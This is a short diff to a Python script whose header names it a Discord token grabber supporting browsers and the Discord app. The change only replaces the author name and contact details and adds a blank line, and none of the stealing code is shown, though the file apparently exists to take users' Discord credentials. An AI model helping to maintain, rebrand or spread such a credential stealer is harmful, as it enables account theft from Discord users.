@@ -1,7 +1,7 @@
 # Discord token grabber with robust browser and Discord app support
 # 7-29-25
-# Author: AirFlow
-# Contact: https://airflowd.netlify.app/
+# Author: Ryōka
+# Contact: @ryukakoi on discord
 
 import os
 import sys
@@ -369,3 +369,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
